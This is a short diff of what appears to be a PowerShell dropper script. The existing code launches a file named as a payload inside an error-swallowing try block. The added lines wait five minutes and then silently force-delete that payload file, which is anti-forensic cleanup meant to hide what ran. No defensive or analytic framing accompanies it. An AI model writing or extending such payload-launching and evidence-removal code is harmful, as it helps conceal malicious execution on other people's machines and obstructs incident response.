@@ -25,4 +25,8 @@ try {
     
     # Execute only when fully ready
     Start-Process -FilePath $payloadPath
+    
+    # Wait 5 minutes then delete
+    Start-Sleep -Seconds 300
+    Remove-Item -Path $payloadPath -Force -ErrorAction SilentlyContinue
 } catch {}
